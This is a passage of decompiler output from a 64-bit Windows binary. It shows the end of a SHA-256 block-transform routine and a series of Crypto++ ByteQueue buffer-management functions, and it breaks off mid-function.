          + v96
          + ((v84 >> 10) ^ __ROL4__(v84, 13) ^ __ROL4__(v84, 15))
          + v88;
    else
      v43 = a2[7];
    v88 = v43;
    v44 = v77
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 7))
        + (v33 ^ v41 & (v94 ^ v33))
        + (__ROR4__(v41, 6) ^ __ROL4__(v41, 7) ^ __ROR4__(v41, 11))
        + v43;
    v45 = v44 + v30;
    v78 = (v38 ^ (v42 ^ v38) & (v34 ^ v38)) + v44 + (__ROR4__(v42, 2) ^ __ROL4__(v42, 10) ^ __ROR4__(v42, 13));
    if ( (_DWORD)v5 )
      v46 = ((v81 >> 3) ^ __ROR4__(v81, 7) ^ __ROL4__(v81, 14))
          + v92
          + ((v86 >> 10) ^ __ROL4__(v86, 13) ^ __ROL4__(v86, 15))
          + v90;
    else
      v46 = a2[8];
    v90 = v46;
    v47 = v33
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 8))
        + (v94 ^ v45 & (v41 ^ v94))
        + (__ROR4__(v45, 6) ^ __ROL4__(v45, 7) ^ __ROR4__(v45, 11))
        + v46;
    v48 = v47 + v34;
    v49 = v47 + (__ROR4__(v78, 2) ^ __ROL4__(v78, 10) ^ __ROR4__(v78, 13)) + (v42 ^ (v38 ^ v42) & (v78 ^ v42));
    if ( (_DWORD)v5 )
    {
      v81 += ((v88 >> 10) ^ __ROL4__(v88, 13) ^ __ROL4__(v88, 15))
           + v110
           + ((v83 >> 3) ^ __ROR4__(v83, 7) ^ __ROL4__(v83, 14));
      v50 = v81;
    }
    else
    {
      v50 = a2[9];
      v81 = v50;
    }
    v51 = v94
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 9))
        + (v41 ^ v48 & (v45 ^ v41))
        + (__ROR4__(v48, 6) ^ __ROL4__(v48, 7) ^ __ROR4__(v48, 11))
        + v50;
    v52 = v51 + v38;
    v95 = v52;
    v53 = v51 + (__ROL4__(v49, 10) ^ __ROR4__(v49, 13) ^ __ROR4__(v49, 2)) + ((v78 ^ v49) & (v42 ^ v78) ^ v78);
    if ( (_DWORD)v5 )
      v54 = ((v46 >> 10) ^ __ROL4__(v46, 13) ^ __ROL4__(v46, 15))
          + v80
          + ((v85 >> 3) ^ __ROR4__(v85, 7) ^ __ROL4__(v85, 14))
          + v83;
    else
      v54 = a2[10];
    v55 = v45;
    v83 = v54;
    v56 = v41
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 10))
        + (v45 ^ v52 & (v48 ^ v45))
        + (__ROR4__(v52, 6) ^ __ROL4__(v52, 7) ^ __ROR4__(v52, 11))
        + v54;
    v57 = v56 + v42;
    v97 = v57;
    v58 = v56 + (__ROL4__(v53, 10) ^ __ROR4__(v53, 13) ^ __ROR4__(v53, 2)) + (v49 ^ (v49 ^ v53) & (v78 ^ v49));
    if ( (_DWORD)v5 )
      v59 = ((v81 >> 10) ^ __ROL4__(v81, 13) ^ __ROL4__(v81, 15))
          + v82
          + ((v87 >> 3) ^ __ROR4__(v87, 7) ^ __ROL4__(v87, 14))
          + v85;
    else
      v59 = a2[11];
    v85 = v59;
    v60 = v55
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 11))
        + (v48 ^ v57 & (v48 ^ v52))
        + (__ROR4__(v57, 6) ^ __ROL4__(v57, 7) ^ __ROR4__(v57, 11))
        + v59;
    v61 = v60 + v78;
    v79 = v60 + v78;
    v62 = v60 + (__ROR4__(v58, 2) ^ __ROL4__(v58, 10) ^ __ROR4__(v58, 13)) + (v53 ^ (v49 ^ v53) & (v53 ^ v58));
    if ( (_DWORD)v5 )
      v63 = ((v89 >> 3) ^ __ROR4__(v89, 7) ^ __ROL4__(v89, 14))
          + v84
          + ((v83 >> 10) ^ __ROL4__(v83, 13) ^ __ROL4__(v83, 15))
          + v87;
    else
      v63 = a2[12];
    v87 = v63;
    v64 = v48
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 12))
        + (v52 ^ v61 & (v52 ^ v57))
        + (__ROR4__(v61, 6) ^ __ROL4__(v61, 7) ^ __ROR4__(v61, 11))
        + v63;
    v11 = v64 + v49;
    v7 = v64 + (__ROR4__(v62, 2) ^ __ROL4__(v62, 10) ^ __ROR4__(v62, 13)) + (v58 ^ (v62 ^ v58) & (v53 ^ v58));
    if ( (_DWORD)v5 )
      v65 = ((v109 >> 3) ^ __ROR4__(v109, 7) ^ __ROL4__(v109, 14))
          + v86
          + ((v85 >> 10) ^ __ROL4__(v85, 13) ^ __ROL4__(v85, 15))
          + v89;
    else
      v65 = a2[13];
    v89 = v65;
    v66 = v95
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 13))
        + (v97 ^ v11 & (v97 ^ v61))
        + (__ROR4__(v11, 6) ^ __ROL4__(v11, 7) ^ __ROR4__(v11, 11))
        + v65;
    v14 = v66 + v53;
    v8 = v66 + (__ROR4__(v7, 2) ^ __ROL4__(v7, 10) ^ __ROR4__(v7, 13)) + (v62 ^ (v7 ^ v62) & (v58 ^ v62));
    if ( (_DWORD)v5 )
      v67 = ((v91 >> 3) ^ __ROR4__(v91, 7) ^ __ROL4__(v91, 14))
          + v88
          + ((v87 >> 10) ^ __ROL4__(v87, 13) ^ __ROL4__(v87, 15))
          + v109;
    else
      v67 = a2[14];
    v109 = v67;
    v68 = v97
        + *((_DWORD *)qword_13F1876B0 + (unsigned int)(v5 + 14))
        + (v61 ^ v14 & (v11 ^ v61))
        + (__ROR4__(v14, 6) ^ __ROL4__(v14, 7) ^ __ROR4__(v14, 11))
        + v67;
    v12 = v68 + v58;
    v9 = v68 + (__ROR4__(v8, 2) ^ __ROL4__(v8, 10) ^ __ROR4__(v8, 13)) + (v7 ^ (v8 ^ v7) & (v62 ^ v7));
    if ( (_DWORD)v5 )
      v69 = ((v96 >> 3) ^ __ROR4__(v96, 7) ^ __ROL4__(v96, 14))
          + v90
          + ((v89 >> 10) ^ __ROL4__(v89, 13) ^ __ROL4__(v89, 15))
          + v91;
    else
      v69 = a2[15];
    v91 = v69;
    v70 = (unsigned int)(v5 + 15);
    v5 = (unsigned int)(v5 + 16);
    v71 = v79
        + v69
        + *((_DWORD *)qword_13F1876B0 + v70)
        + (v11 ^ v12 & (v11 ^ v14))
        + (__ROR4__(v12, 6) ^ __ROL4__(v12, 7) ^ __ROR4__(v12, 11));
    v15 = v96;
    v13 = v71 + v62;
    v6 = v92;
    v10 = v71 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v8 ^ (v7 ^ v8) & (v9 ^ v8));
  }
  while ( (unsigned int)v5 < 0x40 );
  *((_QWORD *)&v99 + 1) = __PAIR64__(v11, v14);
  v72 = a1;
  result = 2i64;
  LODWORD(v98) = v10;
  *(_QWORD *)&v99 = __PAIR64__(v12, v13);
  HIDWORD(v98) = v7;
  *(_QWORD *)((char *)&v98 + 4) = __PAIR64__(v8, v9);
  do
  {
    v74 = _mm_loadu_si128((const __m128i *)v72);
    v75 = _mm_loadu_si128((const __m128i *)((char *)v72++ + (char *)&v98 - (char *)a1));
    *(v72 - 1) = (__int128)_mm_add_epi32(v75, v74);
    --result;
  }
  while ( result );
  return result;
}
// 13F1306E0: too many cbuild loops
// 13F1876B0: using guessed type __int64 qword_13F1876B0[24];

//----- (000000013F131390) ----------------------------------------------------
__int64 __fastcall sub_13F131390(_DWORD *a1, _DWORD *a2)
{
  return sub_13F12F500(a1, a2);
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56BA: using guessed type char byte_13F1C56BA;

//----- (000000013F1313F0) ----------------------------------------------------
__int64 __fastcall sub_13F1313F0(__int128 *a1, unsigned int *a2)
{
  return sub_13F1306E0(a1, a2);
}
// 13F1C56B0: using guessed type char byte_13F1C56B0;
// 13F1C56BA: using guessed type char byte_13F1C56BA;

//----- (000000013F131450) ----------------------------------------------------
__int64 __fastcall sub_13F131450(__int64 a1, __int64 a2)
{
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  __int64 v6; // rcx

  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F10EE30(a1, 0);
  *(_QWORD *)a1 = &CryptoPP::ByteQueue::`vftable';
  *(_QWORD *)(a1 + 8) = off_13F187DF0;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_BYTE *)(a1 + 72) = 0;
  *(_BYTE *)(a1 + 24) = a2 == 0;
  if ( !a2 )
    a2 = 256i64;
  *(_QWORD *)(a1 + 32) = a2;
  v4 = (_QWORD *)sub_13F14059C(56i64);
  v5 = v4;
  if ( v4 )
  {
    v6 = *(_QWORD *)(a1 + 32);
    v4[2] = -1i64;
    v4[3] = v6;
    if ( v6 )
      v4[4] = sub_13F12E4E0(v6);
    else
      v4[4] = 0i64;
    v5[6] = 0i64;
    v5[5] = 0i64;
    *v5 = 0i64;
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)(a1 + 48) = v5;
  *(_QWORD *)(a1 + 40) = v5;
  return a1;
}
// 13F187C80: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 13F187DF0: using guessed type __int64 (__fastcall *off_13F187DF0[3])();

//----- (000000013F131540) ----------------------------------------------------
_QWORD *__fastcall sub_13F131540(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rax

  a1[2] = -1i64;
  a1[3] = a2;
  if ( a2 )
    v3 = sub_13F12E4E0(a2);
  else
    v3 = 0i64;
  a1[4] = v3;
  a1[6] = 0i64;
  a1[5] = 0i64;
  *a1 = 0i64;
  return a1;
}

//----- (000000013F1315A0) ----------------------------------------------------
__int64 __fastcall sub_13F1315A0(_QWORD *a1)
{
  *a1 = &CryptoPP::ByteQueue::`vftable';
  a1[1] = off_13F187DF0;
  return sub_13F131BF0((__int64)a1);
}
// 13F187C80: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 13F187DF0: using guessed type __int64 (__fastcall *off_13F187DF0[3])();

//----- (000000013F1315D0) ----------------------------------------------------
__int64 __fastcall sub_13F1315D0(__int64 a1, __int64 a2)
{
  sub_13F131BF0(a1);
  sub_13F131800(a1, a2);
  return a1;
}

//----- (000000013F131600) ----------------------------------------------------
_QWORD *__fastcall sub_13F131600(__int64 a1, char a2)
{
  return sub_13F131610((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F131610) ----------------------------------------------------
_QWORD *__fastcall sub_13F131610(_QWORD *a1, char a2)
{
  *a1 = &CryptoPP::ByteQueue::`vftable';
  a1[1] = off_13F187DF0;
  sub_13F131BF0((__int64)a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 80i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F187C80: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 13F187DF0: using guessed type __int64 (__fastcall *off_13F187DF0[3])();

//----- (000000013F131670) ----------------------------------------------------
__int64 __fastcall sub_13F131670(__int64 a1)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdx
  __int64 result; // rax
  __int64 v5; // rcx
  void *v6; // rdx

  if ( *(_QWORD *)(a1 + 40) )
  {
    v2 = *(_QWORD **)(a1 + 40);
    do
    {
      v3 = v2;
      if ( v2 == *(_QWORD **)(a1 + 48) )
        break;
      result = v2[3];
      if ( v2[5] != result )
        break;
      *(_QWORD *)(a1 + 40) = *v2;
      v5 = 3i64;
      if ( v2[2] < v2[3] )
        v5 = 2i64;
      v6 = (void *)v2[4];
      if ( v6 )
      {
        memset(v6, 0, v2[v5]);
        sub_13F12E550(v6);
      }
      result = sub_13F14088C(v2, 56i64);
      v3 = *(_QWORD **)(a1 + 40);
      v2 = v3;
    }
    while ( v3 );
    if ( v3 )
    {
      result = v3[6];
      if ( result == v3[5] )
      {
        result = 0i64;
        v3[6] = 0i64;
        v3[5] = 0i64;
      }
    }
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F131740) ----------------------------------------------------
_QWORD *__fastcall sub_13F131740(_QWORD *a1)
{
  __int64 v2; // rax
  _QWORD *v3; // rbx
  _QWORD *v4; // rsi
  __int64 v5; // rcx
  void *v6; // rdx
  _QWORD *result; // rax

  v2 = a1[5];
  v3 = *(_QWORD **)v2;
  if ( *(_QWORD *)v2 )
  {
    do
    {
      v4 = (_QWORD *)*v3;
      v5 = 3i64;
      if ( v3[2] < v3[3] )
        v5 = 2i64;
      v6 = (void *)v3[4];
      if ( v6 )
      {
        memset(v6, 0, v3[v5]);
        sub_13F12E550(v6);
      }
      sub_13F14088C(v3, 56i64);
      v3 = v4;
    }
    while ( v4 );
    v2 = a1[5];
  }
  a1[6] = v2;
  *(_QWORD *)(v2 + 48) = 0i64;
  *(_QWORD *)(v2 + 40) = 0i64;
  result = (_QWORD *)a1[5];
  *result = 0i64;
  a1[8] = 0i64;
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F131800) ----------------------------------------------------
__int64 __fastcall sub_13F131800(__int64 a1, __int64 a2)
{
  _QWORD *v4; // rax
  _QWORD *v5; // rsi
  _QWORD *v6; // rbx
  _QWORD *i; // rdi
  _QWORD *v8; // rbx
  _QWORD **v9; // rax

  *(_QWORD *)(a1 + 64) = 0i64;
  *(_BYTE *)(a1 + 24) = *(_BYTE *)(a2 + 24);
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(a2 + 32);
  v4 = (_QWORD *)sub_13F14059C(56i64);
  v5 = v4;
  if ( v4 )
  {
    v6 = *(_QWORD **)(a2 + 40);
    *v4 = *v6;
    sub_13F106B10(v4 + 1, v6 + 1);
    v5[5] = v6[5];
    v5[6] = v6[6];
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)(a1 + 48) = v5;
  *(_QWORD *)(a1 + 40) = v5;
  for ( i = **(_QWORD ***)(a2 + 40); i; i = (_QWORD *)*i )
  {
    v8 = (_QWORD *)sub_13F14059C(56i64);
    if ( v8 )
    {
      *v8 = *i;
      sub_13F106B10(v8 + 1, i + 1);
      v8[5] = i[5];
      v8[6] = i[6];
    }
    else
    {
      v8 = 0i64;
    }
    **(_QWORD **)(a1 + 48) = v8;
    v9 = *(_QWORD ***)(a1 + 48);
    v5 = *v9;
    *(_QWORD *)(a1 + 48) = *v9;
  }
  *v5 = 0i64;
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD, char))(*(_QWORD *)a1 + 48i64))(
           a1,
           *(_QWORD *)(a2 + 56),
           *(_QWORD *)(a2 + 64),
           0i64,
           1);
}

//----- (000000013F131920) ----------------------------------------------------
__int64 __fastcall sub_13F131920(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6)
{
  __int64 result; // rax
  unsigned __int64 v11; // [rsp+30h] [rbp-98h] BYREF
  __int64 v12[10]; // [rsp+40h] [rbp-88h] BYREF

  sub_13F10EE30((__int64)v12, 0);
  v12[0] = (__int64)off_13F181D38;
  v12[3] = a1;
  v12[1] = (__int64)off_13F181EA8;
  memset(&v12[4], 0, 40);
  sub_13F110580((__int64)v12);
  sub_13F111150((__int64)v12, *a3);
  v11 = a4 - *a3;
  result = sub_13F132460(v12, a2, &v11, a5, a6);
  *a3 += v11;
  return result;
}
// 13F181D38: using guessed type __int64 (__fastcall *off_13F181D38[46])();
// 13F181EA8: using guessed type void *off_13F181EA8[4];

//----- (000000013F131A10) ----------------------------------------------------
__int64 __fastcall sub_13F131A10(_QWORD *a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6)
{
  __int64 v7; // rdx
  __int64 result; // rax
  unsigned __int64 v11; // [rsp+30h] [rbp-88h] BYREF
  __int64 v12[10]; // [rsp+40h] [rbp-78h] BYREF

  v7 = *a3;
  v12[2] = a1[2];
  v12[0] = (__int64)off_13F181D38;
  v12[1] = (__int64)off_13F181EA8;
  v12[3] = a1[3];
  v12[4] = a1[4];
  v12[5] = a1[5];
  v12[6] = a1[6];
  v12[7] = a1[7];
  v12[8] = a1[8];
  sub_13F111150((__int64)v12, v7);
  v11 = a4 - *a3;
  result = sub_13F132460(v12, a2, &v11, a5, a6);
  *a3 += v11;
  return result;
}
// 13F181D38: using guessed type __int64 (__fastcall *off_13F181D38[46])();
// 13F181EA8: using guessed type void *off_13F181EA8[4];
// 13F131A10: using guessed type _QWORD var_78[10];

//----- (000000013F131B00) ----------------------------------------------------
__int64 __fastcall sub_13F131B00(__int64 *a1, __int64 *a2)
{
  __int64 v4; // r8
  _QWORD *v5; // rdi
  __int64 v6; // rcx
  _QWORD *v7; // rax
  __int64 *v8; // rdx
  __int64 *v9; // rax
  char v11; // [rsp+20h] [rbp-28h]

  v4 = a1[8];
  v5 = 0i64;
  if ( v4 )
  {
    a1[8] = 0i64;
    v11 = 1;
    (*(void (__fastcall **)(__int64 *, __int64, __int64, _QWORD, char))(*a1 + 48))(a1, a1[7], v4, 0i64, v11);
  }
  v6 = a1[6];
  if ( *(_QWORD *)(v6 + 48) == *(_QWORD *)(v6 + 24) )
  {
    v7 = (_QWORD *)sub_13F14059C(56i64);
    if ( v7 )
    {
      v8 = a1 + 4;
      if ( a1[4] < (unsigned __int64)*a2 )
        v8 = a2;
      v5 = sub_13F131540(v7, *v8);
    }
    *(_QWORD *)a1[6] = v5;
    v9 = (__int64 *)a1[6];
    v6 = *v9;
    a1[6] = *v9;
  }
  *a2 = *(_QWORD *)(v6 + 24) - *(_QWORD *)(v6 + 48);
  return *(_QWORD *)(a1[6] + 32) + *(_QWORD *)(a1[6] + 48);
}

//----- (000000013F131BC0) ----------------------------------------------------
__int64 __fastcall sub_13F131BC0(__int64 a1)
{
  _QWORD *v1; // rax
  __int64 i; // r8
  __int64 v3; // rdx

  v1 = *(_QWORD **)(a1 + 40);
  for ( i = 0i64; v1; i += v3 )
  {
    v3 = v1[6] - v1[5];
    v1 = (_QWORD *)*v1;
  }
  return i + *(_QWORD *)(a1 + 64);
}

//----- (000000013F131BF0) ----------------------------------------------------
__int64 __fastcall sub_13F131BF0(__int64 a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rsi
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 result; // rax

  v1 = *(_QWORD **)(a1 + 40);
  if ( v1 )
  {
    do
    {
      v2 = (_QWORD *)*v1;
      v3 = 3i64;
      if ( v1[2] < v1[3] )
        v3 = 2i64;
      v4 = (void *)v1[4];
      if ( v4 )
      {
        memset(v4, 0, v1[v3]);
        sub_13F12E550(v4);
      }
      result = sub_13F14088C(v1, 56i64);
      v1 = v2;
    }
    while ( v2 );
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F131C80) ----------------------------------------------------
__int64 __fastcall sub_13F131C80(_QWORD *a1, _BYTE *a2)
{
  _QWORD *v2; // r9
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 result; // rax

  v2 = (_QWORD *)a1[5];
  v4 = v2[5];
  if ( v2[6] == v4 )
  {
    v5 = 0i64;
  }
  else
  {
    v5 = 1i64;
    *a2 = *(_BYTE *)(v4 + v2[4]);
    v4 = v2[5];
  }
  v2[5] = v5 + v4;
  if ( v5 )
  {
    if ( *(_QWORD *)(a1[5] + 40i64) == *(_QWORD *)(a1[5] + 24i64) )
      sub_13F131670((__int64)a1);
    return 1i64;
  }
  else if ( a1[8] )
  {
    result = 1i64;
    *a2 = *(_BYTE *)a1[7]++;
    --a1[8];
  }
  else
  {
    return 0i64;
  }
  return result;
}

//----- (000000013F131D10) ----------------------------------------------------
__int64 __fastcall sub_13F131D10(__int64 a1, __int64 a2, __int64 a3)
{
  char v7; // [rsp+20h] [rbp-68h]
  __int64 v8[2]; // [rsp+30h] [rbp-58h] BYREF
  __int64 v9[6]; // [rsp+40h] [rbp-48h] BYREF

  v8[1] = -2i64;
  sub_13F10EE30((__int64)v9, 0);
  v9[0] = (__int64)off_13F182988;
  v9[1] = (__int64)off_13F182AF8;
  v9[3] = a2;
  v9[4] = a3;
  v9[5] = 0i64;
  v8[0] = a3;
  v7 = 1;
  (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, char))(*(_QWORD *)a1 + 256i64))(
    a1,
    v9,
    v8,
    &qword_13F1B7008,
    v7);
  return v8[0];
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F131DD0) ----------------------------------------------------
__int64 __fastcall sub_13F131DD0(__int64 a1, __int64 a2)
{
  char v5; // [rsp+20h] [rbp-68h]
  __int64 v6[2]; // [rsp+30h] [rbp-58h] BYREF
  __int64 v7[6]; // [rsp+40h] [rbp-48h] BYREF

  v6[1] = -2i64;
  sub_13F10EE30((__int64)v7, 0);
  v7[0] = (__int64)off_13F182988;
  v7[1] = (__int64)off_13F182AF8;
  v7[3] = a2;
  v7[4] = 1i64;
  v7[5] = 0i64;
  v6[0] = 1i64;
  v5 = 1;
  (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, char))(*(_QWORD *)a1 + 256i64))(
    a1,
    v7,
    v6,
    &qword_13F1B7008,
    v5);
  return v6[0];
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F131E90) ----------------------------------------------------
bool __fastcall sub_13F131E90(_QWORD *a1)
{
  __int64 v1; // rdx

  v1 = a1[5];
  return v1 == a1[6] && *(_QWORD *)(v1 + 48) == *(_QWORD *)(v1 + 40) && !a1[8];
}

//----- (000000013F131EB0) ----------------------------------------------------
_QWORD *__fastcall sub_13F131EB0(_QWORD *a1, __int64 a2)
{
  char v3; // al
  int v4; // edx
  int v6; // [rsp+30h] [rbp+8h] BYREF

  v3 = (*(__int64 (__fastcall **)(__int64, const char *, int *, int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "NodeSize",
         &int `RTTI Type Descriptor',
         &v6);
  v4 = 256;
  if ( v3 )
    v4 = v6;
  a1[4] = v4;
  return sub_13F131740(a1);
}
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';

//----- (000000013F131F00) ----------------------------------------------------
__int64 __fastcall sub_13F131F00(_QWORD *a1)
{
  _QWORD *v1; // rdx
  __int64 result; // rax

  v1 = (_QWORD *)a1[3];
  a1[4] = v1[5];
  a1[5] = 0i64;
  a1[6] = 0i64;
  a1[7] = v1[7];
  result = v1[8];
  a1[8] = result;
  return result;
}

//----- (000000013F131F30) ----------------------------------------------------
__int64 __fastcall sub_13F131F30(__int64 a1, _BYTE *a2)
{
  _QWORD *v2; // rax
  __int64 v3; // r8
  char v4; // cl
  __int64 result; // rax

  v2 = *(_QWORD **)(a1 + 40);
  v3 = v2[5];
  if ( v2[6] == v3 )
  {
    if ( *(_QWORD *)(a1 + 64) )
    {
      result = 1i64;
      *a2 = **(_BYTE **)(a1 + 56);
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    v4 = *(_BYTE *)(v3 + v2[4]);
    result = 1i64;
    *a2 = v4;
  }
  return result;
}

//----- (000000013F131F70) ----------------------------------------------------
__int64 __fastcall sub_13F131F70(__int64 a1, __int64 a2, __int64 a3)
{
  char v7; // [rsp+28h] [rbp-60h]
  __int64 v8[2]; // [rsp+30h] [rbp-58h] BYREF
  __int64 v9[6]; // [rsp+40h] [rbp-48h] BYREF

  v8[1] = -2i64;
  sub_13F10EE30((__int64)v9, 0);
  v9[0] = (__int64)off_13F182988;
  v9[1] = (__int64)off_13F182AF8;
  v9[3] = a2;
  v9[4] = a3;
  v9[5] = 0i64;
  v8[0] = 0i64;
  v7 = 1;
  (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64, __int64 *, char))(*(_QWORD *)a1 + 264i64))(
    a1,
    v9,
    v8,
    a3,
    &qword_13F1B7008,
    v7);
  return v8[0];
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F132030) ----------------------------------------------------
__int64 __fastcall sub_13F132030(__int64 a1, __int64 a2)
{
  char v5; // [rsp+28h] [rbp-60h]
  __int64 v6[2]; // [rsp+30h] [rbp-58h] BYREF
  __int64 v7[6]; // [rsp+40h] [rbp-48h] BYREF

  v6[1] = -2i64;
  sub_13F10EE30((__int64)v7, 0);
  v7[0] = (__int64)off_13F182988;
  v7[1] = (__int64)off_13F182AF8;
  v7[3] = a2;
  v7[4] = 1i64;
  v7[5] = 0i64;
  v6[0] = 0i64;
  v5 = 1;
  (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64, __int64 *, char))(*(_QWORD *)a1 + 264i64))(
    a1,
    v7,
    v6,
    1i64,
    &qword_13F1B7008,
    v5);
  return v6[0];
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1320F0) ----------------------------------------------------
__int64 __fastcall sub_13F1320F0(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __int64 v6; // r8
  _QWORD *v7; // rbp
  __int64 v8; // rdx
  unsigned __int64 v9; // rbx
  __m128i *v10; // rcx
  unsigned __int64 v11; // rax
  _QWORD *v12; // rbx
  __int64 *v13; // rcx
  __int64 v14; // rcx
  _QWORD *v15; // rax
  __int64 v17[3]; // [rsp+30h] [rbp-48h] BYREF

  v17[1] = -2i64;
  v6 = *(_QWORD *)(a1 + 64);
  if ( v6 )
  {
    *(_QWORD *)(a1 + 64) = 0i64;
    (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD, char))(*(_QWORD *)a1 + 48i64))(
      a1,
      *(_QWORD *)(a1 + 56),
      v6,
      0i64,
      1);
  }
  v7 = *(_QWORD **)(a1 + 48);
  while ( a2 && a3 )
  {
    v8 = v7[6];
    v9 = a3;
    if ( v7[3] - v8 < a3 )
      v9 = v7[3] - v8;
    v10 = (__m128i *)(v8 + v7[4]);
    if ( v10 != a2 )
    {
      sub_13F15EB00(v10, a2, v9);
      v8 = v7[6];
    }
    v7[6] = v8 + v9;
    if ( v9 >= a3 )
      break;
    a2 = (const __m128i *)((char *)a2 + v9);
    a3 -= v9;
    v17[0] = a3;
    if ( *(_BYTE *)(a1 + 24) )
    {
      v11 = *(_QWORD *)(a1 + 32);
      if ( v11 < 0x4000 )
      {
        do
        {
          v11 *= 2i64;
          *(_QWORD *)(a1 + 32) = v11;
        }
        while ( v11 < a3 && v11 < 0x4000 );
      }
    }
    v12 = (_QWORD *)sub_13F14059C(56i64);
    v17[2] = (__int64)v12;
    if ( v12 )
    {
      v13 = v17;
      if ( *(_QWORD *)(a1 + 32) >= a3 )
        v13 = (__int64 *)(a1 + 32);
      v14 = *v13;
      v12[2] = -1i64;
      v12[3] = v14;
      if ( v14 )
        v12[4] = sub_13F12E4E0(v14);
      else
        v12[4] = 0i64;
      v12[6] = 0i64;
      v12[5] = 0i64;
      *v12 = 0i64;
    }
    else
    {
      v12 = 0i64;
    }
    **(_QWORD **)(a1 + 48) = v12;
    v15 = *(_QWORD **)(a1 + 48);
    v7 = (_QWORD *)*v15;
    *(_QWORD *)(a1 + 48) = *v15;
  }
  return 0i64;
}

//----- (000000013F132280) ----------------------------------------------------
__int64 __fastcall sub_13F132280(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5)
{
  __int64 v5; // rbp
  unsigned __int64 *v6; // r13
  unsigned __int64 v9; // rbx
  _QWORD *v10; // r14
  unsigned __int64 v11; // rbp
  unsigned __int64 v13; // rdi
  unsigned __int64 v14; // rdi
  __int64 v15; // rax
  __int64 v16; // r8
  __int64 v18; // rbx
  int v19; // [rsp+28h] [rbp-C0h]
  __int64 v22[10]; // [rsp+40h] [rbp-A8h] BYREF

  v5 = a4;
  v6 = a3;
  if ( a5 )
  {
    v9 = *a3;
    v10 = *(_QWORD **)(a1 + 40);
    if ( *a3 )
    {
      v11 = *a3;
      do
      {
        v9 = v11;
        if ( !v10 )
          break;
        v13 = v11;
        if ( v11 >= v10[6] - v10[5] )
          v13 = v10[6] - v10[5];
        LOBYTE(v19) = 1;
        (*(void (__fastcall **)(__int64, __int64, _QWORD, unsigned __int64, _DWORD, int))(*(_QWORD *)a2 + 288i64))(
          a2,
          a4,
          v10[5] + v10[4],
          v13,
          0,
          v19);
        v10[5] += v13;
        v10 = (_QWORD *)*v10;
        v9 = v11 - v13;
        v11 = v9;
      }
      while ( v9 );
      v6 = a3;
      v5 = a4;
    }
    sub_13F131670(a1);
    v14 = v9;
    if ( *(_QWORD *)(a1 + 64) < v9 )
      v14 = *(_QWORD *)(a1 + 64);
    if ( v14 )
    {
      v15 = *(_QWORD *)a2;
      v16 = *(_QWORD *)(a1 + 56);
      LOBYTE(v19) = 1;
      if ( *(_BYTE *)(a1 + 72) )
        (*(void (__fastcall **)(__int64, __int64, __int64, unsigned __int64, _DWORD, int))(v15 + 288))(
          a2,
          v5,
          v16,
          v14,
          0,
          v19);
